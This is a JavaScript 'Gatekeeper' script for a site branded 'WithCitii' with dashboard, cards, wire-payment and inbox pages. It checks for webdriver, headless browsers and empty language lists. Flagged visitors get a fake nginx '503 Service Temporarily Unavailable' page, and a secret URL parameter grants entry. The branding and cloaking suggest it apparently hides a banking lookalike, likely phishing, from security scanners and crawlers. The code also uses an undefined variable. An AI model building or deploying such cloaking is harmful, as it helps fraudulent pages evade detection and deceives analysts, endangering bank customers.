/**
 * Advanced Gatekeeper - Antiblocking & Antiscraping Protection
 * Handles bot detection, headless browser checks, and lazy loading for "WithCitii".
 */

const Gatekeeper = {
    settings: {
        isBot: false,
        verificationTime: 2500, // Time in ms for "Security Check"
        entryParam: 'v', // The secret parameter for direct entry
        entryValue: '1'
    },

    init: function() {
        try {
            this.runChecks();
            if (this.settings.isBot) {
                this.handleBot();
            } else {
                // Ensure body is ready before continuing with UI injection
                if (!document.body) {
                    window.addEventListener('load', () => this.init());
                    return;
                }

                // Only show verification splash if not already authorized in session
                // const isVerified = sessionStorage.getItem('gk_auth') === 'true';
                // if (!isVerified) {
                //     this.handleHuman();
                // }

                this.initializePWA();
                this.injectMobileUI();
            }
        } catch (e) {
            console.error("[GK] Init Error:", e);
            // Emergency fallback: remove splash if it exists
            const s = document.getElementById('gatekeeper-splash');
            if (s) s.remove();
        }
    },

    initializePWA: function() {
        // 1. Dynamic Meta Tag Injection
        const metaTags = [
            { name: 'apple-mobile-web-app-capable', content: 'yes' },
            { name: 'apple-mobile-web-app-status-bar-style', content: 'default' },
            { name: 'theme-color', content: '#056dae' },
            { name: 'mobile-web-app-capable', content: 'yes' },
            { name: 'apple-mobile-web-app-title', content: 'WithCitii' }
        ];

        metaTags.forEach(tag => {
            if (!document.querySelector(`meta[name="${tag.name}"]`)) {
                const m = document.createElement('meta');
                m.name = tag.name;
                m.content = tag.content;
                document.head.appendChild(m);
            }
        });

        // 2. Manifest Link
        if (!document.querySelector('link[rel="manifest"]')) {
            const l = document.createElement('link');
            l.rel = 'manifest';
            l.href = 'manifest.json';
            document.head.appendChild(l);
        }

        // 3. Service Worker Registration
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('/sw.js').catch(err => console.log('SW registration failed:', err));
            });
        }
    },

    injectMobileUI: function() {
        // Only inject for mobile widths
        if (window.innerWidth >= 768) return;

        // SKIP injection for Public pages (Element-based detection)
        if (document.querySelector('form#login-form') || document.querySelector('.landing-hero')) {
            console.log("[GK] Public page detected: Skipping nav injection.");
            return;
        }

        // 1. Inject Styles for Mobile Nav (Integrated & Clean)
        const style = document.createElement('style');
        style.innerHTML = `
            .mobile-nav-bar {
                position: fixed; bottom: 0; left: 0; right: 0;
                background: rgba(255, 255, 255, 0.98); 
                backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
                border-top: 1px solid rgba(0, 0, 0, 0.05);
                display: flex; justify-content: space-around; align-items: center;
                padding: 10px 0 calc(env(safe-area-inset-bottom, 0) + 10px) 0;
                z-index: 2000;
                box-shadow: 0 -2px 10px rgba(0,0,0,0.03);
            }
            .mobile-nav-item {
                display: flex; flex-direction: column; align-items: center;
                gap: 3px; color: #94a3b8; text-decoration: none; font-size: 9px;
                font-weight: 700; text-transform: uppercase; letter-spacing: 0.03em;
                transition: all 0.2s ease;
                flex: 1;
            }
            .mobile-nav-item.active { 
                color: #056dae; 
            }
            .mobile-nav-item span { 
                font-size: 22px; 
            }
            .mobile-nav-item:active { opacity: 0.6; }
            
            /* Account for the fixed nav height */
            body { padding-bottom: 70px !important; }

            /* Force hide redundant desktop nav */
            nav.sticky, nav.bg-white { display: none !important; }
        `;
        document.head.appendChild(style);

        // 2. Create the Nav
        const nav = document.createElement('div');
        nav.className = 'mobile-nav-bar';
        
        const items = [
            { id: 'dashboard.html', icon: 'dashboard', label: 'Home' },
            { id: 'cards.html', icon: 'credit_card', label: 'Cards' },
            { id: 'wire.html', icon: 'payments', label: 'Pay' },
            { id: 'messages.html', icon: 'mail', label: 'Inbox' }
        ];

        items.forEach(item => {
            const a = document.createElement('a');
            a.href = item.id;
            a.className = `mobile-nav-item ${path.includes(item.id) ? 'active' : ''}`;
            a.innerHTML = `
                <span class="material-symbols-outlined">${item.icon}</span>
                <p>${item.label}</p>
            `;
            nav.appendChild(a);
        });

        document.body.appendChild(nav);
    },

    runChecks: function() {
        // 1. Basic Webdriver check
        if (navigator.webdriver) this.settings.isBot = true;

        // 2. Headless Chrome checks
        const userAgent = navigator.userAgent.toLowerCase();
        if (userAgent.includes('headless')) this.settings.isBot = true;
        
        // 3. Automated Scripts / Scraper signatures
        if (!navigator.languages || navigator.languages.length === 0) this.settings.isBot = true;
        
        // 4. Check for common datacenter / bot fingerprints
        // (Simplified for this version)
        if (window.chrome && !window.chrome.app) {
           // Some headless versions lack .app
        }

        // 5. Check if entry is authorized via secret parameter
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get(this.settings.entryParam) === this.settings.entryValue) {
            this.settings.isBot = false; // Override for authorized entry
            sessionStorage.setItem('gk_auth', 'true');
        }

        // 6. Check session-based bypass
        if (sessionStorage.getItem('gk_auth') === 'true') {
            this.settings.isBot = false;
        }
    },

    handleBot: function() {
        console.warn("[GK] Security Triggered");
        // Show a fake "Under Maintenance" page or blank
        document.documentElement.innerHTML = `
            <!DOCTYPE html>
            <html>
                <head><title>503 Service Temporarily Unavailable</title></head>
                <body style="font-family: sans-serif; text-align: center; padding-top: 100px; background: #f4f4f4; color: #333;">
                    <h1 style="font-size: 3rem; margin-bottom: 0;">503</h1>
                    <p style="font-size: 1.2rem; color: #666;">Service Temporarily Unavailable</p>
                    <hr style="max-width: 400px; margin: 20px auto; border: 0; border-top: 1px solid #ccc;">
                    <p style="font-size: 0.8rem; color: #999;">nginx/1.18.0 (Ubuntu)</p>
                </body>
            </html>
        `;
        window.stop();
    },

    handleHuman: function() {
        // Hide the body content initially and show a "Checking Browser" screen
        const style = document.createElement('style');
        style.innerHTML = `
            #gatekeeper-splash {
                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background: white; z-index: 999999; display: flex; flex-direction: column;
                align-items: center; justify-content: center; font-family: 'Inter', sans-serif;
                transition: opacity 0.5s ease-out;
            }
            .spinner {
                width: 40px; height: 40px; border: 3px solid rgba(0,0,0,0.1);
                border-top-color: #056dae; border-radius: 50%; animation: spin 0.8s linear infinite;
                margin-bottom: 20px;
            }
            @keyframes spin { to { transform: rotate(360deg); } }
            .status-text { font-size: 14px; color: #555; font-weight: 600; }
        `;
        document.head.appendChild(style);

        const splash = document.createElement('div');
        splash.id = 'gatekeeper-splash';
        splash.innerHTML = `
            <div class="spinner"></div>
            <div class="status-text">Verifying security of your connection...</div>
        `;
        document.body.appendChild(splash);

        // Record a delay then fade out
        setTimeout(() => {
            splash.style.opacity = '0';
            setTimeout(() => splash.remove(), 500);
            sessionStorage.setItem('gk_auth', 'true');
        }, this.settings.verificationTime);
    }
};

// Auto-init on script load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => Gatekeeper.init());
} else {
    Gatekeeper.init();
}
